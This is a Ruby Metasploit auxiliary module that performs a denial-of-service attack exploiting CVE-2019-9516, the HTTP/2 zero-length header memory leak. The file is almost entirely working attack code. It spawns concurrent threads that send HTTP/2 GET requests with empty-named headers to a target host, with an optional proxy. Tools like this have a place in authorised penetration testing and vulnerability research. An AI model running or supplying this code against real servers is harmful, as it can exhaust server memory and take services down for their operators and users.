##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/Placidina/metasploit
##

require 'net-http2'
require 'uri'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'HTTP/2 0-Length Headers Leak',
        'Author' => ['Alan Placidina Maria'],
        'References' => [
          ['CVE' '2019-9516']
        ],
        'DisclosureDate' => 'Mar 01 2019'
      )
    )

    register_options(
      [
        OptString.new('HOST', [true, 'The hostname', '']),
        OptString.new('PROXY', [false, 'Proxy url', '']),
        OptInt.new('RLIMIT', [true, 'The number of requests to send', 200]),
        OptInt.new('THREADS', [true, 'The number of concurrent threads', 5]),
        OptInt.new('TIMEOUT', [true, 'The maximum time in seconds to wait for each request to finish', 15])
      ]
    )
  end

  def rlimit
    datastore['RLIMIT']
  end

  def thread_count
    datastore['THREADS']
  end

  def timeout
    datastore['TIMEOUT']
  end

  def hostname
    datastore['HOST']
  end

  def opts
    if !datastore['PROXY'].empty?
      uri = URI.parse(datastore['PROXY'])
      return {
        proxy_addr: "#{uri.scheme}://#{uri.host}",
        proxy_port: uri.port.to_s
      }
    end
  end

  def run
    starting_thread = 1
    while starting_thread < rlimit
      ubound = [rlimit - (starting_thread - 1), thread_count].min
      print_status("Executing requests #{starting_thread} - #{(starting_thread + ubound) - 1}...")

      threads = []
      1.upto(ubound) do |i|
        threads << framework.threads.spawn("Module(#{refname})-request#{(starting_thread - 1) + i}", false, i) do |_i|
          headers = { '' => Rex::Text.rand_text_english(rand(1..42)) }
          options = opts.nil? ? nil : opts

          client = nil
          if !opts.nil?
            client = NetHttp2::Client.new("https://#{hostname}", options = opts)
          else
            client = NetHttp2::Client.new("https://#{hostname}")
          end

          request = client.prepare_request(:get, '/', headers: headers, timeout: timeout)

          client.on(:error) do |err|
            print_error("Exception has been raised: #{err}")
          end

          client.call_async(request)
          client.join
          client.close
        end
      end

      threads.each(&:join)
      print_good("Finished executing requests #{starting_thread} - #{(starting_thread + ubound) - 1}")
      starting_thread += ubound
    end
  end
end
